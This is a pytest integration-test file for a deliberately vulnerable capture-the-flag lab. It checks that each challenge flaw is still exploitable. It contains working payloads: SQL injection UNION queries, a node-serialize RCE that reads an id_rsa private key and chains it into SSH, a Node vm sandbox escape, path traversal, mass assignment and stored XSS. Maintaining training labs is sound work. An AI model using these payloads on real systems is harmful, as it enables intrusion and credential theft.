"""Integration tests: one check per challenge flaw / easter egg.

Each test replays (in an adapted form) the matching cflix1_exploits write-up and
asserts that the hole is still present and exploitable, and that the expected
easter egg is still recoverable — despite the modernization of the stack
(.NET 10, Node 26, PHP 8, MySQL 9, PostgreSQL 18...).

Challenges that depend on infrastructure external to the stack (NAS/SMB for the
exfiltration part of challenge 5, requestb.in for challenge 12, the bonus
challenges based on posters/images) are not replayed end to end: we verify the
application-level hole that makes them possible.
"""
import codecs
import json
import re
import subprocess

import pytest
import requests

from conftest import (
    CFLIX_URL, HACKO_URL, HACKO_HOST, ROBOTSHOP_URL, SSH_HOST,
    IMGVIEWER_SSH_PORT, HACKO_SSH_PORT, FLAGS, CARTMAN_PASSWORD, new_session,
)

UA = {"User-Agent": "cflix-tests", "Accept-Encoding": "none"}


# --------------------------------------------------------------------------- #
# Challenge 1 — stored XSS (Html.Raw): easter egg hidden in a comment
# --------------------------------------------------------------------------- #
def test_01_xss_stored_easter_egg(user_session):
    r = user_session.get(f"{CFLIX_URL}/Media/1", headers=UA)
    assert r.status_code == 200
    # The hole: review content is rendered through @Html.Raw -> the attacker's
    # injected <script> is served verbatim (not escaped).
    assert "<script" in r.text.lower(), "raw review HTML should go through (Html.Raw)"
    # The easter egg is hidden in one of those comments.
    assert FLAGS["p1_xss"] in r.text, "challenge 1 easter egg not found"


# --------------------------------------------------------------------------- #
# Challenges 2, 3, 5 — SQL injection (FromSqlRaw + concatenation)
# UNION to exfiltrate the content of the hidden reviews (ids 12, 10, 11).
# --------------------------------------------------------------------------- #
def _sqli_review(sess, review_id):
    q = (f"1' and 1=0 union select 1,2,Content,4,null,null "
         f"from Reviews where id={review_id} -- -")
    r = sess.get(f"{CFLIX_URL}/Search", params={"query": q}, headers=UA)
    assert r.status_code == 200
    assert "DBError" not in r.text, "the SQLi query triggered a DB error"
    m = re.search(r'<img[^>]*src="2"[^>]*alt="([^"]*)"', r.text, re.S)
    assert m, f"the UNION projection (review {review_id}) did not surface in the HTML"
    return m.group(1)


def test_02_sqli_union_review12(user_session):
    alt = _sqli_review(user_session, 12)
    assert len(alt) > 50, "review 12 content not exfiltrated"
    # Review 12 is the "official" message carrying the challenge hint.
    assert "Oups" in alt or "soucis" in alt


def test_03_sqli_union_review10(user_session):
    alt = _sqli_review(user_session, 10)
    # Review 10: obfuscated JS payload (packer) hiding the easter egg.
    assert "powned" in alt or "eval" in alt or len(alt) > 1000


def test_05_sqli_union_review11(user_session):
    alt = _sqli_review(user_session, 11)
    # Review 11: hint pointing to the NAS share (the SMB exfiltration itself is
    # out of scope for the docker-compose stack).
    assert len(alt) > 500


# --------------------------------------------------------------------------- #
# Challenge 4 — mass assignment: elevation to the Alpha account
# --------------------------------------------------------------------------- #
def test_04_mass_assignment_to_alpha():
    s = new_session(elevate_alpha=True)   # posts AccountType=Alpha (unexpected field)
    r = s.get(f"{CFLIX_URL}/Profile/me", headers=UA)
    assert "Alpha" in r.text, "Alpha elevation (mass assignment) failed"
    # Concrete consequence: access to the Alpha-only area (Viewer).
    r = s.get(f"{CFLIX_URL}/Viewer", params={"mediaId": "6"}, headers=UA)
    assert r.status_code == 200, "an Alpha account should be able to reach the Viewer"


# --------------------------------------------------------------------------- #
# Challenge 6 — post-it password (static): used as the entry point for challenge 7
# --------------------------------------------------------------------------- #
def test_06_postit_password_is_cartman_ssh():
    # The challenge 6 easter egg is cartman's SSH password (challenge 7). We
    # verify it indirectly: it must grant SSH access (see test 07).
    assert FLAGS["p6_postit"] == CARTMAN_PASSWORD


# --------------------------------------------------------------------------- #
# Challenge 7 — SSH (cartman) on the ImageViewer + pcap retrieval
# --------------------------------------------------------------------------- #
def test_07_cartman_ssh_and_pcap(tmp_path):
    paramiko = pytest.importorskip("paramiko")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(SSH_HOST, port=IMGVIEWER_SSH_PORT, username="cartman",
              password=CARTMAN_PASSWORD, timeout=15,
              look_for_keys=False, allow_agent=False)
    try:
        ftp = c.open_sftp()
        local = tmp_path / "capture.pcap"
        ftp.get("/app/capture_interessante.pcap", str(local))
        ftp.close()
    finally:
        c.close()
    assert local.stat().st_size > 0, "pcap empty / not retrieved"

    # Optional decoding (like the write-up) if scapy is available. We scan the
    # payloads for a base64 token decoding to a flag (robust to the session-key
    # format, which varies across scapy versions).
    try:
        from scapy.all import rdpcap, Raw
    except Exception:
        pytest.skip("scapy missing: pcap retrieval verified, decoding skipped")
    pcap = rdpcap(str(local))
    found = None
    for pkt in pcap:
        if not pkt.haslayer(Raw):
            continue
        try:
            text = pkt[Raw].load.decode("latin-1")
        except Exception:
            continue
        for tok in re.split(r"[\s\r\n]+", text):
            if len(tok) < 8 or len(tok) % 4:
                continue
            try:
                dec = codecs.decode(tok.encode(), "base64").decode("utf-8")
            except Exception:
                continue
            if dec.startswith("CFl1X-"):
                found = dec
                break
        if found:
            break
    assert found, "no decodable CFl1X- flag found in the pcap"


# --------------------------------------------------------------------------- #
# Challenge 8 — LFI / directory traversal on CFlix.ImageViewer
# --------------------------------------------------------------------------- #
def test_08_lfi_directory_traversal(alpha_session):
    r = alpha_session.get(f"{CFLIX_URL}/Viewer/View",
                          params={"mediaId": "6",
                                  "imageName": "../../../appsettings.json"},
                          headers=UA)
    assert r.status_code == 200
    data = json.loads(codecs.decode(r.content, "utf-8-sig"))
    assert data.get("flag") == FLAGS["p8_lfi"], "LFI: expected flag not read"


# --------------------------------------------------------------------------- #
# Challenge 9 — NodeJS deserialization (node-serialize 0.0.4, CVE-2017-5941)
# --------------------------------------------------------------------------- #
def _nodejs_rce(command):
    payload = ('{ "payload": "_$$ND_FUNC$$_function(){ var result = '
               "require('child_process').execSync('" + command + "'); "
               'return result.toString(); }()" }')
    r = requests.post(f"{HACKO_URL}/cookie", data=payload, verify=False, timeout=20,
                      headers={**UA, "Host": HACKO_HOST,
                               "Content-Type": "application/x-www-form-urlencoded"})
    assert r.status_code == 200, f"/cookie responded {r.status_code}"
    return r.text


def test_09_nodeserialize_rce_passphrase():
    out = _nodejs_rce("cat README.md")
    # RCE confirmed: the attacker's README contains the key passphrase.
    assert FLAGS["p9_passphrase"] in out, "node-serialize RCE failed (passphrase missing)"


def test_09_nodeserialize_rce_reads_private_key():
    out = _nodejs_rce("cat id_rsa")
    assert "PRIVATE KEY" in out, "the id_rsa private key should be exfiltrable via the RCE"


# --------------------------------------------------------------------------- #
# Challenge 10 — `vm` sandbox escape (SSH port 845) + nuclear code
# --------------------------------------------------------------------------- #
def _hacko_ssh_key():
    """Fetch + decrypt the private key via the challenge 9 RCE (chaining)."""
    paramiko = pytest.importorskip("paramiko")
    import io
    key_pem = json.loads(_nodejs_rce("cat id_rsa"))["payload"]
    pkey = paramiko.RSAKey.from_private_key(
        io.StringIO(key_pem), password=FLAGS["p9_passphrase"])
    return paramiko, pkey


_ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")


def _hacko_vm_exec(js):
    """Run a command in the vm sandbox (vorpal) over SSH (user hackonymousoflix).

    The login shell is vm.js (vorpal, interactive): we open a shell, let the
    banner scroll by, send the command, then read the output while stripping the
    ANSI line-editing sequences.
    """
    import time
    paramiko, pkey = _hacko_ssh_key()
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(SSH_HOST, port=HACKO_SSH_PORT, username="hackonymousoflix",
              pkey=pkey, timeout=20, look_for_keys=False, allow_agent=False)
    try:
        chan = c.invoke_shell()
        chan.settimeout(1.0)

        def drain(seconds):
            buf = b""
            end = time.time() + seconds
            while time.time() < end:
                try:
                    data = chan.recv(65535)
                    if not data:
                        break
                    buf += data
                except Exception:
                    time.sleep(0.1)
            return buf

        drain(2.5)                 # banner / vorpal prompt
        chan.sendall(js + "\n")
        out = drain(4.0)
        return _ANSI.sub("", out.decode("latin-1")).replace("\r", "")
    finally:
        c.close()


def test_10_vm_sandbox_escape_reads_nuclear_access():
    # vm context escape: read a file outside the sandbox through the
    # constructor-of-a-constructor trick (process.mainModule...). We target
    # .shell.sh, which contains NUCLEAR_BOMB_ACCESS, proving the escape.
    js = ("exec eval(String('t').concat('his')).constructor.constructor("
          "String('console.l').concat"
          "('og(process.mainModule.constructor._load(\\'fs\\')"
          ".readFileSync(\\'/home/hackonymousoflix/.shell.sh\\').toString())'))()")
    out = _hacko_vm_exec(js)
    assert FLAGS["p10_access"] in out, \
        "vm escape failed: NUCLEAR_BOMB_ACCESS not read outside the sandbox"


def test_10_nuclear_password_accepted():
    # Easter egg: the correct nuclear code triggers the sequence (critical
    # regression fixed: crypto.createCipher removed in Node 18+).
    js = f"launchnb none {FLAGS['p10_nuclear']}"
    out = _hacko_vm_exec(js)
    assert ("Félicitations" in out or "troisième guerre" in out or "bash" in out), \
        "the nuclear code is no longer accepted (crypto.createCipher regression?)"


# --------------------------------------------------------------------------- #
# Challenge 11 — binary exploitation: properties that keep ret2win possible
# --------------------------------------------------------------------------- #
def _compose_dir():
    import os
    return os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src")


def _docker_exec(service, cmd):
    return subprocess.check_output(
        ["docker", "compose", "exec", "-T", service, "sh", "-c", cmd],
        cwd=_compose_dir(), text=True, stderr=subprocess.DEVNULL)


def _docker_compose(*args):
    subprocess.run(["docker", "compose", *args], cwd=_compose_dir(),
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


def test_11_binary_is_exploitable_by_design():
    # The setuid binary must stay non-PIE (fixed address of `faille`) and
    # without protections, otherwise the ret2win write-up would no longer work.
    ls = _docker_exec("hackonymousoflix", "ls -l /home/will.byers/exploit")
    assert ls.startswith("-rws"), f"the setuid bit is missing: {ls!r}"
    etype = _docker_exec("hackonymousoflix", "readelf -h /home/will.byers/exploit | grep Type:")
    assert "EXEC" in etype, f"the binary must not be PIE (ret2win): {etype!r}"
    faille = _docker_exec("hackonymousoflix",
                          "objdump -d /home/will.byers/exploit | grep '<faille>:'")
    assert "faille" in faille, "the `faille` symbol (the ret2win target) is missing"


# --------------------------------------------------------------------------- #
# Challenge 12 — RobotShop (PHP): stored XSS + cookie-protected admin page
# --------------------------------------------------------------------------- #
def test_12_robotshop_admin_flag_via_cookie():
    r = requests.get(f"{ROBOTSHOP_URL}/shop_administrator.php",
                     cookies={"adminCookie": FLAGS["admin_cookie"]},
                     headers=UA, timeout=15)
    assert r.status_code == 200
    assert FLAGS["p12_robotshop"] in r.text, "RobotShop admin flag not found"


def test_12_robotshop_contact_is_xss_sink():
    # The hole: contact.php stores the message without escaping (xssSanitizer is
    # a no-op) -> the admin bot (shoxx-bot) runs it when visiting read.php
    # (cookie theft originally). We pause the bot so it does not drain read.php
    # while we check the sink.
    marker = "<script>/*cflix-xss-probe*/</script>"
    _docker_compose("pause", "shoxxbot")
    try:
        requests.post(f"{ROBOTSHOP_URL}/contact.php",
                      data={"message": marker},
                      headers={**UA, "Content-Type": "application/x-www-form-urlencoded"},
                      timeout=15)
        r = requests.get(f"{ROBOTSHOP_URL}/read.php",
                         cookies={"adminCookie": FLAGS["admin_cookie"]},
                         headers=UA, timeout=15)
    finally:
        _docker_compose("unpause", "shoxxbot")
    assert r.status_code == 200
    assert marker in r.text, "read.php should echo the raw message (XSS sink)"
